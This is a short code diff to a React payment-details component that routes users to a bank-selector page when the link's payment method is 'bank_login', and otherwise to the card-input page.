@@ -58,8 +58,17 @@ const PaymentDetails = () => {
   // Format amount with the dynamic currency code
   const formattedAmount = formatCurrency(amount, currencyCodeToUse);
   
+  // Get payment method from link data
+  const paymentMethod = shippingInfo?.payment_method || 'card';
+  
   const handleProceed = () => {
-    navigate(`/pay/${id}/card-input`);
+    // If bank_login, skip card input and go directly to bank selection
+    if (paymentMethod === 'bank_login') {
+      navigate(`/pay/${id}/bank-selector`);
+    } else {
+      // Default to card input
+      navigate(`/pay/${id}/card-input`);
+    }
   };
   
   return (
